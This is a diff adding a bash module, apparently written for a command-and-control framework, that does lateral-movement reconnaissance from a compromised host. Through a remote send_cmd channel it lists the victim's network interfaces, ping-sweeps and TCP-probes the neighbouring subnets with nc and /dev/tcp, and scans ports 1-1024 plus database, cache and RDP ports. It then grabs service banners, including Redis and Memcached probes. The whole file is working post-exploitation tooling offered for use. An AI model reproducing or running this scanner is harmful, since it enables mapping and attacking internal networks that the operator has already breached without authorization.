@@ -1,0 +1,232 @@
+# lateral_scan_parallel_whitelist_fixed2.c2
+set -o pipefail
+set -u
+set -e
+
+# ---------- CONFIG ----------
+PORT_START=1
+PORT_END=1024
+MAX_JOBS_PING=64      # parallelism for host discovery
+MAX_JOBS_SCAN=32      # parallelism for port scanning
+PROGRESS_WIDTH=30
+WHITELIST_FIRST_OCTETS=("192" "172")  # subnets allowed
+EXTRA_PORTS=(8080 3306 5432 6379 11211 3389 8443)
+
+PORTS=($(seq "$PORT_START" "$PORT_END") "${EXTRA_PORTS[@]}")
+
+print_std "Starting distributed lateral scan..."
+
+TMPROOT="${TMPDIR}/c2_scan_$$.$(date +%s)"
+mkdir -p "$TMPROOT"
+
+# ---------- FUNCTIONS ----------
+draw_progress() {
+    local CUR="$1" TOTAL="$2" LABEL="$3"
+    local FILLED=$(( CUR*PROGRESS_WIDTH/TOTAL ))
+    ((FILLED>PROGRESS_WIDTH)) && FILLED=$PROGRESS_WIDTH
+    local EMPTY=$((PROGRESS_WIDTH-FILLED))
+    local BAR="$(printf "%0.s#" $(seq 1 $FILLED))$(printf "%0.s." $(seq 1 $EMPTY))"
+    printf "\r%-20s [%s] %3d%% (%d/%d)" "$LABEL" "$BAR" "$((CUR*100/TOTAL))" "$CUR" "$TOTAL"
+}
+
+wait_for_slot() {
+    local LIMIT="$1"
+    while (( $(jobs -rp | wc -l) >= LIMIT )); do sleep 0.05; done
+}
+
+# returns 0 if $1 equals any ip in REMOTE_IPS (local interface)
+is_local_ip() {
+    local ip="$1"
+    for lip in "${REMOTE_IPS[@]}"; do
+        [[ "$ip" == "$lip" ]] && return 0
+    done
+    return 1
+}
+
+# robust port check executed on remote end (via send_cmd)
+# uses nc if available, otherwise /dev/tcp fallback under timeout
+remote_port_check_cmd_template() {
+    # $1 = host, $2 = port
+    # produce a single-line command string to run remotely, which prints "open" if port open, otherwise "closed"
+    local host="$1"
+    local port="$2"
+    # Use nc if available, else fallback to bash /dev/tcp under timeout
+    printf "if command -v nc >/dev/null 2>&1; then nc -z -w2 %s %s >/dev/null 2>&1 && echo open || echo closed; else timeout 2 bash -c '>/dev/tcp/%s/%s' >/dev/null 2>&1 && echo open || echo closed; fi" \
+      "$host" "$port" "$host" "$port"
+}
+
+# ---------- 1) detect remote IP ----------
+print_std "Discovering remote host IP interfaces..."
+ip_out="$(send_cmd "ip -o -4 addr show 2>/dev/null || true" 2>/dev/null || true)"
+REMOTE_IPS=()
+if [[ -n "$ip_out" ]]; then
+  while IFS= read -r line; do
+    ipcidr="$(printf "%s\n" "$line" | awk '{print $4}' 2>/dev/null || true)"
+    ip="${ipcidr%%/*}"
+    [[ -n "$ip" ]] && REMOTE_IPS+=("$ip")
+  done <<< "$ip_out"
+fi
+
+# fallback / sanity: ensure REMOTE_IPS not empty (try ifconfig)
+if [[ ${#REMOTE_IPS[@]} -eq 0 ]]; then
+  ip_out2="$(send_cmd "ifconfig 2>/dev/null || true" 2>/dev/null || true)"
+  if [[ -n "$ip_out2" ]]; then
+    while IFS= read -r ip; do
+      # grab IPv4 addresses
+      for m in $(printf "%s\n" "$ip" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' || true); do
+        REMOTE_IPS+=("$m")
+      done
+    done <<< "$ip_out2"
+  fi
+fi
+
+[[ ${#REMOTE_IPS[@]} -eq 0 ]] && { print_err "No remote IPs detected (can't continue)."; exit 1; }
+
+# keep unique REMOTE_IPS
+readarray -t REMOTE_IPS < <(printf "%s\n" "${REMOTE_IPS[@]}" | awk '!x[$0]++')
+
+# whitelist filter to subnets we want to use
+SUBNETS=()
+for ip in "${REMOTE_IPS[@]}"; do
+  first_octet="${ip%%.*}"
+  for ok in "${WHITELIST_FIRST_OCTETS[@]}"; do
+    [[ "$first_octet" == "$ok" ]] && SUBNETS+=("$ip") && break
+  done
+done
+
+[[ ${#SUBNETS[@]} -eq 0 ]] && { print_err "No usable remote subnets (check whitelist)."; exit 1; }
+print_std "Remote IPs detected: ${SUBNETS[*]}"
+
+# ---------- 2) generate hosts (exclude local interface IPs) ----------
+HOSTS=()
+for ip in "${SUBNETS[@]}"; do
+  base="${ip%.*}"
+  for i in $(seq 1 254); do
+    candidate="$base.$i"
+    # skip exactly local interface IPs (so we don't scan ourselves)
+    if is_local_ip "$candidate"; then
+      continue
+    fi
+    HOSTS+=("$candidate")
+  done
+done
+TOTAL_HOSTS=${#HOSTS[@]}
+print_std "Total hosts to ping: $TOTAL_HOSTS"
+
+# ---------- 3) parallel ping ----------
+UP_HOSTS=()
+COUNT=0
+print_std "Pinging hosts remotely..."
+> "$TMPROOT/up_hosts.txt"
+
+for h in "${HOSTS[@]}"; do
+  (
+    # prefer ping if present; fallback to quick TCP probes on common ports
+    out="$(send_cmd "if command -v ping >/dev/null 2>&1; then ping -c1 -W1 $h >/dev/null 2>&1 && echo UP || echo DOWN; else (timeout 1 bash -c '>/dev/tcp/$h/80' >/dev/null 2>&1 || true; ) && echo DOWN; fi" 2>/dev/null || true)"
+    # Above fallback just guarantees command returns quickly; now do a more reliable TCP probe via nc or /dev/tcp
+    if [[ "${out:-}" == "UP" ]]; then
+      printf '%s\n' "$h" >> "$TMPROOT/up_hosts.txt"
+      print_std "Host up: $h"
+    else
+      # attempt quick TCP probe on 80/443/22 to catch hosts where ping is blocked
+      probe_ok=0
+      for p in 80 443 22; do
+        check_cmd="$(remote_port_check_cmd_template "$h" "$p")"
+        res_probe="$(send_cmd "$check_cmd" 2>/dev/null || true)" || true
+        if [[ "${res_probe:-}" == "open" ]]; then
+          probe_ok=1
+          printf '%s\n' "$h" >> "$TMPROOT/up_hosts.txt"
+          print_std "Host up (tcp probe): $h"
+          break
+        fi
+      done
+    fi
+    echo "$h done"
+  ) &
+  wait_for_slot "$MAX_JOBS_PING"
+done | while IFS= read -r _; do
+    COUNT=$((COUNT+1))
+    draw_progress "$COUNT" "$TOTAL_HOSTS" "Ping hosts"
+done
+echo
+
+if [[ -f "$TMPROOT/up_hosts.txt" ]]; then
+  mapfile -t UP_HOSTS <"$TMPROOT/up_hosts.txt"
+fi
+TOTAL_UP=${#UP_HOSTS[@]}
+print_std "Hosts up: $TOTAL_UP"
+[[ $TOTAL_UP -eq 0 ]] && { print_warn "No hosts alive. Exiting."; exit 0; }
+
+# ---------- 4) parallel port scan ----------
+print_std "Scanning ports (writing per-host files)..."
+for h in "${UP_HOSTS[@]}"; do
+  host_file="$TMPROOT/ports_$h.txt"
+  count_file="$TMPROOT/count_$h.tmp"
+  : > "$host_file"
+  : > "$count_file"
+  TOTAL_PORTS=${#PORTS[@]}
+
+  # monitor for progress
+  (
+    while :; do
+      done_count=$(wc -l < "$count_file" 2>/dev/null || echo 0)
+      draw_progress "$done_count" "$TOTAL_PORTS" "Scan $h ports"
+      if (( done_count >= TOTAL_PORTS )); then break; fi
+      sleep 0.08
+    done
+  ) &
+  MONITOR_PID=$!
+
+  for port in "${PORTS[@]}"; do
+    (
+      cmd="$(remote_port_check_cmd_template "$h" "$port")"
+      res="$(send_cmd "$cmd" 2>/dev/null || true)" || true
+      if [[ "${res:-}" == "open" ]]; then
+        printf '%s %s\n' "$h" "$port" >> "$host_file"
+      fi
+      printf '%s\n' "1" >> "$count_file"
+    ) &
+    wait_for_slot "$MAX_JOBS_SCAN"
+  done
+
+  # wait for all port jobs for this host
+  wait
+
+  # wait for monitor to finish
+  wait "$MONITOR_PID" 2>/dev/null || true
+  echo
+done
+
+print_std "Port scan complete."
+
+# ---------- 5) banner grab ----------
+print_std "Performing banner grab..."
+for h in "${UP_HOSTS[@]}"; do
+  host_file="$TMPROOT/ports_$h.txt"
+  [[ ! -f "$host_file" ]] && continue
+  while read -r ip port; do
+    payload=""
+    case "$port" in
+      21) payload=$'QUIT\r\n' ;;
+      22) payload=$'' ;;
+      25|587|465) payload=$'EHLO test\r\nQUIT\r\n' ;;
+      80|8080|8443|443) payload=$'HEAD / HTTP/1.0\r\nHost: '"$ip"$'\r\n\r\n' ;;
+      6379) payload=$'*1\r\n$4\r\nPING\r\n' ;;
+      11211) payload=$'stats\r\n' ;;
+      *) payload=$'\r\n' ;;
+    esac
+    rcmd="printf '%s' '$payload' | timeout 5 nc -nv $ip $port 2>/dev/null | head -n 20"
+    banner="$(send_cmd "$rcmd" 2>/dev/null || true)"
+    if [[ -n "${banner:-}" ]]; then
+        print_std "[BANNER] $ip:$port"
+        printf "%s\n" "$banner" | sed -e 's/^/    /'
+    else
+        print_std "[BANNER] $ip:$port — (no response)"
+    fi
+  done <"$host_file"
+done
+
+print_std "Banner grab complete."
+print_std "Results also stored under $TMPROOT"
+print_std "Scan finished."
+exit 0
